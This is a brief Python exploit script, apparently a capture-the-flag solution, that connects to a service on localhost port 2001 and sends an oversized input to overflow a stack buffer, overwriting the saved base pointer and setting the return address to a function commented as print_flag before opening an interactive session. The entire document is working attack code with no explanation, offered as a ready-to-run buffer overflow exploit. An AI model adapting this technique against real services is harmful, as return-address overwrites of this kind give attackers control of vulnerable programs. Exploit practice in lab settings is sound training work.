#!/usr/bin/python3

import socket
import telnetlib

s = socket.create_connection(('localhost', 2001))


data_count = str(0x420)
data_count += '\n'
s.send(data_count.encode('ASCII'))

data = b'A'*0x408   # overwrite buffer
data += b'B'*0x10   # overwrite base pointer and stuff
data += 0x401803.to_bytes(8, 'little')  # set return address to print_flag
data += b'\n'
s.send(data)



t = telnetlib.Telnet()
t.sock = s
t.interact()



s.close()
